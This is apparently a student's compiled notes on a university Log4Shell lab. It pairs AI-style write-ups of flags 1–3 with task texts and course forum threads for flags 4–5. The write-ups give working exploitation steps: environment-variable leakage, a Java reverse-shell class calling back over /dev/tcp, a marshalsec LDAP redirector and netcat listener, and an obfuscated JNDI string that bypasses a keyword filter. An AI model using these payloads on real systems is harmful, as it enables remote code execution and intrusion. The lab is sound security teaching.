FLAG1-Start
How the Log4Shell Vulnerability Works

The Vulnerability: Log4j is a system that applications use to record what they're doing (like a diary). When Log4j writes something to its logs, it looks for special patterns like ${...} and replaces them with values.
What We Did: We used the "location" HTTP header to inject the special pattern ${env:ADMIN_PASSWORD}. When the application logged our request, Log4j saw this pattern and replaced it with the actual value of the ADMIN_PASSWORD environment variable.
Why It Worked: The application was vulnerable because:

It was using a vulnerable version of Log4j (version 2.x before 2.15.0)
It was directly logging user input (the HTTP headers)
The environment variable ADMIN_PASSWORD contained our flag

 
The Command Breakdown:
Copycurl 'http://localhost:8080/rest/cartoons/isAlive' -H 'GATECH_ID:904074283' -H 'location:${env:ADMIN_PASSWORD}'

We sent a request to the application
We included our GATECH_ID (required by the application)
We set the "location" header to ${env:ADMIN_PASSWORD}
The application logged our request, including the headers
Log4j processed the special pattern and revealed the flag



This is a real-world vulnerability that affected millions of applications in December 2021. Companies had to scramble to patch their systems because attackers could not only read environment variables but also execute arbitrary code on vulnerable servers.
Is there anything specific about the vulnerability or the exploit that you'd like me to explain in more detail?
FLAG1-END




Flag2-Start
Log4Shell Vulnerability Exploitation - Flag 2 Success
Congratulations on retrieving Flag 2! Let me provide a detailed explanation of what we did and how the exploit worked:
The Vulnerability
The Log4Shell vulnerability (CVE-2021-44228) is a critical remote code execution flaw in Apache Log4j, a widely used Java logging library. It allows attackers to execute arbitrary code on vulnerable systems by sending specially crafted requests that contain malicious JNDI (Java Naming and Directory Interface) lookup strings.
Our Exploit Process
Here's the step-by-step breakdown of how we achieved remote code execution:
1. Environment Setup
We configured four separate terminals:

Terminal 1: For compiling the exploit code and sending the malicious request
Terminal 2: Python HTTP server to serve our malicious Java class
Terminal 3: LDAP server to handle the JNDI lookup and redirect to our Python server
Terminal 4: Netcat listener to catch the reverse shell connection

2. Creating the Malicious Java Code
We created a Java class (Exploit.java) with a reverse shell payload that would execute when loaded:
javaCopyimport java.io.IOException;
public class Exploit {
    static {
        try {
            String[] cmd = {"/bin/bash", "-c", "bash -i >& /dev/tcp/172.17.0.1/9999 0>&1"};
            Runtime.getRuntime().exec(cmd);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
    
    public Exploit() {
        System.out.println("Entering Exploit");
    }
}
This code uses a static initializer block that runs when the class is loaded, executing a bash command to create a reverse shell connection to our listening port.
3. Setting Up the Attack Infrastructure

Python HTTP Server: Started on port 4242 to serve our Exploit.class file
Copypython3 -m http.server 4242

LDAP Server: Started on port 1389 to handle JNDI lookups and redirect to our HTTP server
Copyjava -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://172.17.0.1:4242/#Exploit" 1389

Netcat Listener: Started on port 9999 to receive the reverse shell connection
Copync -nlvp 9999


4. Triggering the Vulnerability
We sent a specially crafted HTTP request to the vulnerable application with a JNDI lookup string in the location header:
Copycurl 'http://localhost:8080/rest/cartoons/isAlive' -H 'GATECH_ID:123456789' -H 'location:${jndi:ldap://172.17.0.1:1389/Exploit}'
5. Exploitation Chain

When the vulnerable application received our request, it logged the headers, including our malicious location header
Log4j processed the ${jndi:ldap://172.17.0.1:1389/Exploit} expression and made a JNDI lookup to our LDAP server
Our LDAP server received the request and redirected it to our Python HTTP server at http://172.17.0.1:4242/Exploit.class
The vulnerable application downloaded and loaded our Exploit.class file
When the Java class was loaded, our static initializer block executed, creating a reverse shell connection back to our netcat listener
We gained a shell as the root user on the vulnerable container
We navigated to the correct directory and executed the Flag2.jar file to retrieve the flag

6. Technical Details
This exploit worked because:

The application was using a vulnerable version of Log4j (pre-2.15.0)
It was logging user-controllable input (HTTP headers) without sanitization
The JNDI functionality in Log4j allowed loading of remote Java classes
The application was running with sufficient privileges to execute our commands

7. Security Impact
In a real-world scenario, this vulnerability allows attackers to:

Execute arbitrary code on vulnerable systems
Gain unauthorized access to internal resources
Establish persistence within the network
Exfiltrate sensitive data
Move laterally to other systems

Log4Shell was one of the most severe vulnerabilities discovered in recent years, affecting millions of systems worldwide and leading to a massive remediation effort across the industry.
This exercise demonstrates the importance of keeping dependencies updated, properly configuring security controls, and implementing defense-in-depth strategies to mitigate such vulnerabilities.
FLAG2-END




FLAG3-Start

TASK---

FLAG 3: Config.Properties Surprise (25 pts)
Make sure you have gone through the Setup and Intro sections.

If you haven’t already, run the start script in the home directory of log4j user, start the container with the start script:

./StartContainer.sh

For this flag we will use the /cartoons/ resource. There are 4 total endpoints for this resource. Only the following 2 are relevant for this flag.

Call the following endpoint to fetch all the records. Save one of the ids.

GET All - Fetch all cartoon records:

curl 'http://localhost:8080/rest/cartoons/cartoonList' -H 'GATECH_ID:123456789'  

Call the following endpoint to GET by ID and inspect the logged output.

GET By ID - Fetch a single cartoon record by ID:

curl 'http://localhost:8080/rest/cartoons/cartoon/<id>' -H 'GATECH_ID:123456789' 

You have caught wind that there is a properties file that this application uses to inject configurable data during runtime.

For this exploit, you will use the log4j exploit to update the “config.properties” file saved in the root directory of the application. This properties file contains a property that will set the rating for all of the children’s cartoons.

See if you can find anything that gives you a hint about how to exploit it/what you need to do, to update the property. Look for an out of place attack vector/variable.

This application links the properties’ rating to all children’s cartoons in its response. You have a beef with childrens cartoons and don’t think kids should watch cartoons. You want to set all of the ratings to R. Mean, catoons are great! However, first, you need to make sure that this is even possible.

One thing to keep in mind is that the application checks to see if this file has been tampered with. You will need to make sure you don’t overwrite the file and instead just update it. This means, all properties need to be as they were except the one you updated.

For this flag, you will need to update the properties file so that when the application builds the cartoon response, it sets the rating to your gatechId. *i.e. 123456789

If successful, you should get your flag in the network field of the response:

alt text

Note: The error message is simply informational and does not mean necessarily that your exploit was successfully executed or not.

Hint: Someone might have tried to roll their own patch and tried to deny requests containing malicious string patterns.
Hint: R rated cartoons are not exploitable.

*** IF THIS FLAG COMES OUT BLANK, Restart container by running the stopContainer and startContainer scripts in the home directory of the log4j user. *****

----END TASK 

Detailed Explanation of Flag 3 Solution
I'm glad you got the flag! Let me walk you through exactly what we did and why it worked:
Understanding the Attack Vector

Identifying the Vulnerability:

We analyzed the logs and found that the application was logging a parameter called dangerZone which appeared as "null" in the logs.
This parameter wasn't being visibly used in the application but was being logged by Log4j, making it a perfect "out-of-place" attack vector as hinted in the instructions.


Testing the Parameter:

We confirmed this was our attack vector by passing a simple value (dangerZone=test) and observing it was correctly logged in the application.



The Log4j Vulnerability (Log4Shell)
The application uses Log4j, which is vulnerable to the Log4Shell vulnerability (CVE-2021-44228). When it logs user-controlled input, it evaluates expressions like ${jndi:ldap://...}, allowing us to:

Trigger a JNDI lookup to our malicious LDAP server
The LDAP server redirects to our HTTP server
The application loads and executes our malicious class

Bypassing Protection
The application had protection against simple Log4j exploits, showing a "teapot" error when detecting standard JNDI lookups. We bypassed this by obfuscating our payload:

We used the format ${j${::-}n${::-}d${::-}i:ldap://172.17.0.1:1389/Exploit}
This syntax splits "jndi" into individual characters with a reversal operator ::-
Log4j resolves these nested expressions before processing the JNDI lookup
The protection mechanism checks for plain strings like "jndi" but doesn't detect our obfuscated version

The Exploit Code
Our Exploit.java file was designed to:

Load the existing config.properties file
Preserve all existing properties
Update only the rating property to your GATECH_ID (904074283)
Save the file back

This was crucial because:

The application checks if the file was tampered with
Overwriting the entire file would trigger protection
We needed to update just one property while preserving others

javaCopyimport java.io.FileInputStream;
import java.io.FileOutputStream;
import java.util.Properties;

public class Exploit {
    static {
        try {
            // Load the existing properties file
            Properties props = new Properties();
            FileInputStream in = new FileInputStream("config.properties");
            props.load(in);
            in.close();
            
            // Update only the rating property to your GATECH_ID
            props.setProperty("rating", "904074283");
            
            // Save the properties back to the file
            FileOutputStream out = new FileOutputStream("config.properties");
            props.store(out, null);
            out.close();
            
            System.out.println("Successfully updated rating property!");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
Setting Up the Attack Infrastructure
We set up two servers:

LDAP Server: Listened on port 1389 and was configured to redirect to our HTTP server when contacted.
HTTP Server: Served our compiled Exploit.class file that the application would download and execute.

Executing the Attack
When we sent our final payload:

The application logged our obfuscated payload
Log4j resolved the nested expressions, turning it into ${jndi:ldap://172.17.0.1:1389/Exploit}
Log4j performed a JNDI lookup to our LDAP server
Our LDAP server redirected to our HTTP server
The application downloaded and executed our Exploit.class
Our exploit code updated the rating property to 904074283
The application processed the modified properties file
When we accessed the cartoon endpoint again, the flag was returned in the network field

Key Lessons

Identifying Attack Vectors: Looking for "out-of-place" parameters that might be logged but not visibly used
Obfuscation Techniques: Bypassing security filters by encoding or obfuscating payloads
Precise Exploitation: Updating only what's necessary while preserving the rest to avoid detection
Understanding System Flow: Timing the attack to occur before the application reads the properties

This flag was particularly challenging because it required finding the right attack vector, properly obfuscating the payload to bypass protection, and writing Java code that carefully updated only the necessary property.

FLAG3-END




FLAG4-Start

--- TASK-

FLAG 4: Command and Concat (25 pts)
Make sure you have gone through the Setup and Intro sections.

If you haven’t already, run the start script in the home directory of log4j user, start the container with the start script:

./StartContainer.sh

For this flag, we will exploit an endpoint that adds a new user:

curl -X PUT 'http://localhost:8080/rest/users/user' -H 'GATECH_ID:123456789' -H 'Content-Type:application/json' --data-raw '{"id":8,"userId":"2134","userName":"RSANCHEZ1","userRole":"R&D","adminYN":"Y"}'

Take some time to inspect this output and see what you need to exploit. Yes the exception is expected, and maybe there is even a clue above it ;)

For this flag, you will construct a malicious file (Exploit.java) and compile it, so that when deserialized it will create a simple “.txt” file on the server to get the flag. Using the log4shell exploit, create a file named “Ronnie.txt” on the server and add ONE line that says “AintNothinButAPeanut!” (You do not need the quote). If you do not follow this exactly, you will not get this flag.

Upon success, you will see the output below. (You might have to scroll for this)

Log file showing INFO messages with method name updateUser, a flag value, and details about publishing for user ID 2134

Hint: The name of this flag is a huge hint as to what you need to do. Pay close attention to the logged messages and their format.

*** **IF THIS FLAG COMES OUT BLANK, Restart container by running the stopContainer and startContainer scripts in the home directory of the log4j user. *****




---END-TASK

Skip to main content
Logo
CS 6035 O01, OCY
–
Ed Discussion

2

New Thread
Courses
56
35
Categories
576 others online
Use left and right arrow keys to adjust the split region size

New Thread
Filter
Use left and right arrow keys to adjust the split region size
Project Log4Shell - Flag 4 Command and Concat #695
Kevin Darlington
2 weeks ago in Projects – Log4Shell

Pinned

Star

Watch

503
55
00
33
Views

This is the post for discussing this flag. If there's any update on the task, we'll post it here. Please, do not open new threads covering this task.

Anyone with questions about citations and plagiarism should consult the appropriate section of the course policy on misconduct.

Note: Do not share code, outside tools you used or any hints beyond the writeup or office hours to other students. We will delete threads and warn you if you overshare.

Comment

Sort by Newest 
Munaimah Khan
5h

Resolved
As per other hints, I don't know how the name of the flag helps, but the solution is really simple. My methodology, (maybe not the best) was to trial and error different attack vectors.


Reply

Joel M Tucker
5h
it's really the best methodology and the most practical to real world 


1
Reply

Amrut Bhalchandra Kulkarni
1d

Resolved
I kinda fell into this flag while testing injections from previous flags

Both the java and how to add the exploit to the attack vector are way more simple than you'd think

Also goes to show how easy it would've been to exploit log4j given how easy injection is and since the Java class can seemingly be anything


Reply

Chalermpon Kesa
1d

Resolved
My python3 -m http.server 4242...returning a 404 File not found error when run the exploit. Any suggestions would be greatly appreciated!


Reply

Ashutosh Agarwal
1d
Make sure you're running the python server in the correct directory that has the exploit.class.
Also, check that your curl syntax has the correct exploit file name.


Reply

Chalermpon Kesa
1d
the exploit.class in Flag3, not in Flag4.  FileNotFoundException: /usr/local/tomcat/webapps/Ronnie.txt (No such file or directory)


Reply

Maruna Michaela Derieg
2d

Resolved
does it matter how I create the file? like do I need to make my exploit.java file execute a bash command to create the file or do I need to have java itself create the file in java language? Also, will I see the success flag 4 in the console.log file once I get the flag?


Reply

Maruna Michaela Derieg
2d
to answer my own question:

yes, we indeed need to create the file and write to it in Java language not in terminal commands that we make java execute (that would have saved me hours if I had known)

you will know that you got it right once you see the file being created. You can find the flag in either of the two log files it doesn't matter


2
Reply

Dylan Jake Hawryluk
2d

Resolved
Finally got it! I skipped flag 3 to try this one, and this one initially was frustrating me as the bottleneck for my flag 3 was I could not find the attack vector, and same was happening for this one for me. I finally though realized what the attack vector really is, and the logic behind it in the logs, once I got it, every time I ran my exploit I saw more and more progression in the logs and I finally updated my code and got it! Just one question, is the logic for locating and using the attack vector on this flag the same for flag 3?


Reply

Kevin Darlington
1d
Nice work! Yes you can hunt for flag 3's attack vector the same way you did this one, but the obfuscation technique will be different. 


1
Reply

Dylan Jake Hawryluk
1d
Thank you, thanks to your tips and the fellow students I was finally able to get the flow of what to look for! And sounds good I will take another stab at it!


Reply

Aniketh Swain
2d

Resolved
So as suggested below I was able to get the java version printed out so I know I have the attack vector. But when I try to put the actual exploit i have, I see a code 400 message bad on my python server with a string of hex chars. Is the file not supposed to be in the root? I do see a path being shown and I tried with that as well. Same issue.

Edit: I also still don't see my print statements in the console.log file either


1
Reply

Kevin Darlington
2d
If your python server is throwing 400 errors, then your exploit is not being triggered because the python server failed. I would check that you are running it in the directory your .class file is in and check that you compiled your java code. 


Reply

Aniketh Swain
2d
I double checked and I am running the py server in the Flag4 directory. I also have recompiled the java file with no issues.


Reply

Aniketh Swain
2d
 Replying to Aniketh Swain
Ah nvm I realized I had the wrong port haha


Reply

Kevin Darlington
2d
 Replying to Aniketh Swain
Nice work! Those things are more common than you would think :)


Reply

Dylan Jake Hawryluk
2d
When you mention printing the java version, are you mentioning that in the same sense of how we did it in the intro, or how we do it with our exploit file? If the latter, then I am very confused on how we use that to get the attack vector currently, any advice?


Reply

Seth Hunter Hemphill
3d

Resolved
For this one, I found it really helpful to start by just seeing if I could find the java version. If you can get the java version, you're in the right direction. Note that you don't need to get the java version, it's just a very easy way to see if you found the attack vector.


7
Reply

Gantabya Kadel
4d

Resolved
I only see one reference to the following error :

[UserService.java:87] ERROR Ronnie.txt was created but contents != "AintNothinButAPeanut!". Contents were: null

down below on the threads and that seems to have been resolved by the poster somehow. Would I be getting this error because the the server seems to wanna write this 3 or so many times ? I just need to ensure that the code only writes if value not present as suggested in flag 3 ? or  would this be a matter of failure to write all together ? 


Reply

Kevin Darlington
4d
Hmm, I don't think you need to ensure if the code only writes once or not, you just need to make sure that it only creates a file with the contents of "AintNothingButAPeanut!" in it. Make sure your code is actually writing to the file. Have you ran this locally?


1
Reply

Gantabya Kadel
4d
Kevin, I did manage to get the flag. Issue was that I was not closing the file. Much like C java won't write/flush the buffer unless closed looks like. 
This is making me appreciate with statements in python so much more. 
Thanks for the help! 😄 


1
Reply

Kevin Darlington
4d
 Replying to Gantabya Kadel
Ah, yup that will do it. haha Nice work and no problem!


Reply

Gantabya Kadel
4d

Resolved
Hello, is the attack vector quite obvious in the logs ? 
I thought it was the Msg but looks like that's just the exception msg var.
I did confirm that if we try to do ldap without masking it'll trigger a teapot via the exploitation method in flag 2. I have a good idea of what I need to do to get the actual flag ... i'm just stuck on finding the vector that should be used past the connection reset portion. Any hints on this ? 
Thank you.


Reply

Gantabya Kadel
4d
I'm now getting this error: Reference Class Name: foo

is this a good sign ? 


Reply

Gantabya Kadel
4d
Update this was indeed a good sign. Fun fact, don't try to add "Reference Class Name" as a key value pair. I did that thinking "Concatenation" and VM crashed 😆 
Turns out my java Exploit wasn't compiled.


1
Reply

Kevin Darlington
4d
Nice work! The reference class foo is a response from the ldap in an event a request fails


1
Reply

Meer Ushter
4d

Resolved
I am a little bit uncertain on my current approach,  the attack vector I am using is something really straightforward ( really its given to us on the writeup). I am able to execute the reverse shell and see the LDAP connecting the python server connecting which i thought I'm on the right track but with the hints being "command and concat" im no longer sure I'm on the right track . 

should i keep working on how i am working towards rn or am i heading in the wrong direction.

thanks in advance.


Reply

Gantabya Kadel
4d
is the supposed attack vector that you got on the curl command that was provided ?
Not sure if you can answer this without giving it away lol sadly


Reply

Meer Ushter
4d
I don't think I can answer that , but i ended up getting the flag , Apparently I was on the right track think about what are you given and the current curl command how does that show up in the server logs , try placing in your values for the reverse hell and see what triggers it . Keep in mind the timing of your attack vector what shows up where to avoid resetting .


Reply

Gantabya Kadel
4d
 Replying to Meer Ushter
Thanks. yeah I figured. 
What I'm doing right now is seeing where the teapot gets triggered etc so we'll see. ty.


Reply

Robert Cody Ackert
4d
Unresolved
I am stuck on this one like the others. I have the exploit to the point where I can redirect to my JavaScript. The file is created but after the file is checked if it exists. I understand "use the name, command and concat" but I don't understand where to apply this. 


Reply

Kevin Darlington
4d
Have you found the attack vector?


Reply

Robert Cody Ackert
2d
Yes. At least what.I believe is the attack vector. I assume I have it. It is redirecting to my javascript on the python web server. 


Reply

Robert Cody Ackert
22h
@Kevin, anything else you can offer? 


Reply

Manan Himanshu Trivedi
4d

Resolved
Might be a dumb question but if the name of the flag is a hint, do we need a java file to get this flag? A bit confused


Reply

Joel M Tucker
4d
Yes the java Exploit object is needed for this flag


Reply

John Wyatt Gamble
5d

Resolved
Endorsed

Who is the muscle head that put this one together? 😂


10
Reply

Kevin Darlington
5d
TIME TO BLEED!


2
Reply

Jorge Emilio Dominguez Najera Sr.
5d

Resolved
What's the proper way to send logs from the Java file for debugging purposes?
I've been using  System.out.println but I never see logs with that, is it any log4j library that needs to be imported in order to send debugging logs propertly?


1
Reply

Ashutosh Agarwal
5d
To see the System.out.println messages you need to tail the console.log file not the cs6035.log file. If you still don't see it, then it's likely that your exploit is not getting executed. 


1
Reply

Jorge Emilio Dominguez Najera Sr.
4d
In that case we would have to keep a separated terminal for tracking console.log instead right? I was trying to see if I can send them to appear in the same cs6035.log file when the exploit was executed. 


Reply

Ashutosh Agarwal
4d
 Replying to Jorge Emilio Dominguez Najera Sr.
Yes, that's correct. 


1
Reply

Rakshaa Ravishankar
6d

Resolved
which folder should the txt file be created to?


Reply

Kevin Darlington
6d
It should just be in the root directory of the project. 


Reply

This comment was deleted
Max Friedman
4d
 Replying to (Deleted)
also stuck here. anyone have any tips?


Reply

Seth Hunter Hemphill
3d
 Replying to Max Friedman
If you're still stuck, try putting in the curl that is given in the instructions and look at the exception that is logged.


Reply

Keymer Botero
6d

Resolved
You guys were NOT kidding as far as sandwiching your stuff. Honestly, I'm glad I took a good look at this thread for ideas.

EDIT: GOD, THE IMPLICATIONS THIS FLAG HAS IS CRAZY. I won't say what it is because that would give away how to solve this flag but like, oh my god. The possibilities are endless, provided you match the format given.


2
Reply

Denis Kasapovic
7d

Resolved
Do not overthink this one, look at the log and see what comes back once you submit the test/example call. Like the hint says "Pay close attention to the logged messages and their format."  What was occurring with the data sent, was the biggest clue for me. If you completed previous flags to get to this point then you know what the original format of the lookup should be.


2
Reply

Joel M Tucker
6d
good tip


Reply

Amrut Bhalchandra Kulkarni
1d
Yup

I kinda fell into this flag while testing injections from previous flags

Both the java and how to add the exploit to the attack vector are way more simple than you'd think

Also goes to show how easy it would've been to exploit log4j given how easy injection is


Reply

David Robert Nygren
1w

Resolved
Would you say, like the other flags, the best approach is to figure out the attack vector, successfully ping the LDAP, and THEN work on the Exploit.java script? The reason I ask is because I'm 95% sure I know the attack vector and given the hint regarding "Command and Concat" I cant figure out how to "sandwich" the jndi lookup in the output to call my ldap correctly.


1
Reply

Joel M Tucker
1w
yeah that's a good approach. One step at a time


Reply

Matthew Joseph Claar
1w

Resolved
For anyone bashing their head against the wall with log errors, restarting the VM got me my flag


Reply

Matthew David Macioce
1w

Resolved
Would seeing the i'm a teapot message mean I need to change my vector or encode/obfuscate it somehow? running into this on flag 3 too - can't escape it lol


Reply

Kevin Darlington
1w
No, the teapot error means that there is a homegrown filter in place that you need to bypass using encoding/obfuscation. 


Reply

Kevin Darlington
1w
You can get this flag however WITHOUT obfuscation and the name of this flag is a hint as to how. 


2
Reply

Alejandro Millan
1w

Resolved
Are we supposed to find a way to bypass:  [Log4jUtilities.java:32] INFO Reset files? If I understand correctly this is being performed right before it looks for the .txt file, so I'm assuming any files being created will be deleted on that action?


Reply

Ashutosh Agarwal
1w
Yes, you'd need to exploit at the right point to get the flag. I'd recommend going through the logs carefully to figure out the correct attack vector. 


Reply

Robert Maness
1w

Resolved
YEAH BUDDY! Aint nothin to it but to do it!


7
Reply

Kevin Darlington
1w
Everybody wanna be a hacker! But ain't nobody wanna exploit no silly dev mistakes! (Sounded better in my head, a lot corny-er in writing but anyways


9
Reply

Sean Chen
1w

Resolved
lightweight baby!


5
Reply

Fahim Sunka
1w
Nice work!


Reply

Brandon Shreve
1w

Resolved
Lightweight! :) 


5
Reply

Kevin Darlington
1w
Yeah buddy!


Reply

Michael Joseph Hearn
1w

Resolved
It's possible to execute code the way you did for 3 but it won't result in the flag in my experience.   If you look at the picture of the flag in the flag4 github you can see it was not gotten the same way as 3 or 2. Use the hint to figure out a new way keep an eye on any hints of what variables can be overwritten.  


1
Reply

Kevin Darlington
1w
Nice work!


Reply

Brandan Tan
2w

Resolved
I managed to get the message that shows `Congratulations! Your flag4 is: ...`. But when i copy and submit that value to Gradescope, it shows up as incorrect. Could a TA please help me check if i indeed have the correct value?


Reply

Kevin Darlington
2w
Sure thing, please make a private post. 


Reply

Brandan Tan
2w
Okay, i just created one private post


Reply

Ruangsak Patomwong
2w

Resolved
Don't forget to compile Exploit.java after you edit your code. I just waste hours for this.


7
Reply

Nicholas Charles Ryan
1w
Also dont forget to move your python server to the correct flag folder. I also wasted hours!


4
Reply

James O Booker
24h
I'm glad I seen your comment to remind me, you saved me a headache.


1
Reply

Omar Arin Solaiman
2w

Resolved
Been able to create a file and proved it happened by creating it in the logs... can't seem to add to it though...
Approaching similar to Flag1, and I have a way to make that file... but the usual way I'd "write/push" to it seems to not work?

got it to write to the other location, but not the base one... 
Is the vector different?


Reply

Omar Arin Solaiman
2w
Figured it out

and it's a little funny being able to use it in that way. Will say that I thought I'd break the rest of it though... 


1
Reply

Kevin Darlington
2w
Nice work!


Reply

Gen Sheng Zhang
2w

Resolved
Is this also meant to use jdni or something different? I see some issues with a foo....


Reply

Gen Sheng Zhang
2w
Please ignore... i was in the wrong directory.


1
Reply

Gen Sheng Zhang
2w
Without giving away too many hints, I don't actually quite get what this has to do with the flag's name. Is there a way to leverage the mechanism explicitly or is this the same as any other log4j injection into a variable...? Just curious, because it seems to work by just updating one vulnerable variable.


Reply

Gen Sheng Zhang
2w
 Replying to Gen Sheng Zhang
i just exploited the vulnerability in the "intended" way probably, by leveraging the name of the flag. But, it still seems to work without it... wondering if I am tripping


1
Reply

Yongmin Li
2w

Resolved
I am getting this ERROR Ronnie.txt was created but contents != "AintNothinButAPeanut!". Contents were: null


Reply

Yongmin Li
2w
NVM, somehow managed to fix this.


Reply

Kevin Darlington
2w
Nice work!


Reply

Corey Cunningham
7d
same


Reply

Kevin Darlington
7d
There could be something wrong with your java code. Can you confirm your code is executing? If so, are you printing out the catch block to check if an exception has been thrown?


Reply

Fatima Muhammad Barakzai
2w

Resolved
I'm creating the file but it gets reset, how am I supposed to pass in the exploit? Is there another variable?


Reply

Ashutosh Agarwal
2w
The name of this flag is a huge hint as to what you need to do. Pay close attention to the logged messages and their format.


1
Reply

Fatima Muhammad Barakzai
2w
Figured it out, thanks


Reply

Ashutosh Agarwal
2w
 Replying to Fatima Muhammad Barakzai
Great job!


Reply




FLAG4-END

FLAG5-Start

---Start-TASK
FLAG 5: PubSub Override (25 pts)
Make sure you have gone through the Setup and Intro sections.

If you haven’t already, run the start script in the home directory of log4j user, start the container with the start script:

./StartContainer.sh

For this flag, we will exploit a previous endpoint that publishes updates to a topic on the server:

curl -X PUT 'http://localhost:8080/rest/users/user' -H 'GATECH_ID:123456789' -H 'Content-Type:application/json' --data-raw '{"id":8,"userId":"2134","userName":"RSANCHEZ1","userRole":"R&D","adminYN":"Y"}'

You remember that properties file? Good! We are going to play with it yet again.

For this exploit, you will use the log4j exploit to overwrite the “config.properties” file saved in the root directory of the application. This properties file contains a topic that the application will publish a message to when updateUser call is made (the application is also subscribed to this topic as you can see in the logs).

You will need to trick the application into publishing a message to a different topic with your GATECH_ID as the account number in order to generate a valid flag.

Upon success, you should see your output similar to that below:

Log file showing the following sequence: preparing to publish for user ID, reading topic from a properties file, publishing to a topic, entering an exploit, and revealing the flag with a congratulatory message

Hint: Look through the cs6035.log to find clues about what this other topic could be. Your flag could be invalid if you have not sent your GATECH_ID appropriately in the published message.

*** **IF THIS FLAG COMES OUT BLANK, Restart container by running the stopContainer and startContainer scripts in the home directory of the log4j user. *****
---END
Skip to main content
Logo
CS 6035 O01, OCY
–
Ed Discussion

2

New Thread
Courses
56
35
Categories
576 others online
Use left and right arrow keys to adjust the split region size

New Thread
Filter
Use left and right arrow keys to adjust the split region size
Project Log4Shell - Flag 5 PubSub Override #696
Kevin Darlington
2 weeks ago in Projects – Log4Shell

Pinned

Star

Watch

513
55
11
33
Views

1
This is the post for discussing this flag. If there's any update on the task, we'll post it here. Please, do not open new threads covering this task.

Anyone with questions about citations and plagiarism should consult the appropriate section of the course policy on misconduct.

Note: Do not share code, outside tools you used or any hints beyond the writeup or office hours to other students. We will delete threads and warn you if you overshare.

Comment

Sort by Newest 
Munaimah Khan
3h
Unresolved
I seem to have tapped into the accountNumber but I see this in the logs

Unable to get flag. Please ensure you entered your GatechId as the accountNumber in the messageVO body as instructed in the writeup

However, when debugging i see my gatechid was part of a received message, what else could this error mean?


Reply

Munaimah Khan
3h
Nvm i got, my tip: ctrl+F keywords from this error and observe behaviors in log


Reply

David Jaffie
6h

Resolved
Is the Ronnie.txt FileNotFoundException expected? Or is that something we need to fix?


Reply

David Jaffie
6h
Update: I was still receiving that exception even when I found the flag. I think it can be disregarded.


Reply

Dylan Jake Hawryluk
23h

Resolved
By far the easiest flag so far. Thank you to everybody hinting to reset the container!!


3
Reply

Fahim Sunka
22h
Nice work! Good to hear that you found it the easiest, it does get easier once you get past the initial learning curve and understand the exploit process.


1
Reply

Dylan Jake Hawryluk
5h
Definitely! Once it clicked for me what I should be looking for and how exactly I am delivering it, it was much better to grasp. Thank you and the rest of the team for the helpful and insightful hints!


Reply

Rachael Cofini
24h

Resolved
I got my topic to change to the correct topic and my accountNum is set to my georgia tech ID but the flag is still not printing and says the unable to get flag please ensure your GatechId as the account number error message but accountnumber is showing my GATECH Id so I am not sure where to go from here? Any tips? It looks like I have everything right but no flag :/


1
Reply

Rachael Cofini
23h
nvmd got the flag now I had it all right for the past hour HINT for everyone if you think you have it right but still not getting the flag restart your tail logs and the container after I did that I got the flag.


Reply

Ashutosh Agarwal
22h
Nice work!


Reply

Amrut Bhalchandra Kulkarni
1d

Resolved
Something that has me a bit concerned

I got a flag, but I didn't see any print statements indicating that the program was entering my exploit

I haven't seen any print statements I tried to use. I have double checked that my GTID is correct on everything though


Reply

Ashutosh Agarwal
1d
You'd need to tail the console.log file to see the System.out.println messages.


1
Reply

Amrut Bhalchandra Kulkarni
22h
I was only checking cs6035.log

The printlns show up in console.log


Reply

Amrut Bhalchandra Kulkarni
1d

Resolved
Just got the flag

Hint: Cronenberg hybrid of a couple previous flags

On an unrelated note, Cronenberg's The Fly starring Jeff Goldblum is a fantastic movie


Reply

Gantabya Kadel
3d

Resolved
This flag was surprisingly  easy to solve. It really is just like flag 3 imo.
Advice for anyone who may be stuck later: follow the discussion in this thread it helps a lot. 
And, if you mess up like me, the logs just tell you where to put what (assuming you did something like one of the previous flags first) 😄 


2
Reply

Kevin Darlington
2d
Nice work!


Reply

Gantabya Kadel
4d

Resolved
Can the previous flag attack vector be utilized ? 


Reply

Joel M Tucker
3d
you can try things out, we won't tell you what attack vector to use


Reply

Gantabya Kadel
3d
That’s fair thanks. I’ll try things post work.


Reply

David Robert Nygren
4d

Resolved
Interesting hint. If you use the methods used in Flag 2 to attain a reverse shell, looking at the input of the config.properties file helped me get the flag. I knew what the "other" topic name was already and had the correct Exploit.java written already, but wasn't overwriting the config.properties file correctly because I didn't have the variable name correct. I realized what it was actually called by inspecting the config.properties file.


3
Reply

Rakshaa Ravishankar
5d

Resolved
I'm not sure what everyone means by "pattern", but I found the other topic in the logs and where it originates from. I tried setting it in my java code but it doesn't seem to do anything or reappear later in the logs when I check the logs after running my curl command. I know I am able to inject bc I see feedback from LDAP and the python server after I run my curl command. Am I on the right track, is there more to the "pattern" than the statement I see where the topic originates in the logs?


Reply

Ashutosh Agarwal
4d
You also need to set your GATECH_ID as the account number in order to generate a valid flag. Review the logs to see if you can identify a method or "pattern" to manipulate the account number field.


Reply

Rakshaa Ravishankar
4d
I am doing this in my java code - is there more to the pattern than where in the logs that the topic and original account number is set?


Reply

Ashutosh Agarwal
4d
 Replying to Rakshaa Ravishankar
The java code only needs to overwrite the config.properties file with the new topic name. You'd need to review the logs and find out how the account number field is getting populated. 


2
Reply

Rakshaa Ravishankar
4d
 Replying to Ashutosh Agarwal
thank you! this clarified things and helped me get the flag.


Reply

Ashutosh Agarwal
4d
 Replying to Rakshaa Ravishankar
Nice work!


Reply

Rakshaa Ravishankar
5d

Resolved
Am I correct in assuming that in this flag we are Not simply updating the config file, we are overwriting it? The instructions for this one say we need to overwrite yet the instructions for flag 3 specified we had to make sure we just update. I have solved flag 3 already, not sure if I'm complicating this but wanted to get this clarification.


Reply

Ashutosh Agarwal
4d
yes, your assumption is correct. 


Reply

David Robert Nygren
5d

Resolved
Are we using the same curl command as Flag 4? I used it to test, and it still connected to my LDAP successfully. I already know the other topics name and such based off hints given below.


Reply

Ashutosh Agarwal
4d
We are exploiting the same endpoint from flag 4 but the curl command might not be exactly the same (since there are a bunch of different things that you need to do in order to get the flag).


Reply

Robert Perry
5d

Resolved
Got the flag. I strongly recommend taking a look at the logs upon restart of app or at the setup page if you feel you are missing something.


1
Reply

Kevin Darlington
5d
Nice work!


Reply

Van Hien Tran
5d

Resolved
I would say pls refer to this comment, it's right here

https://edstem.org/us/courses/69023/discussion/6222719?comment=14448075


2
Reply

Cosdyn Akers
5d

Resolved
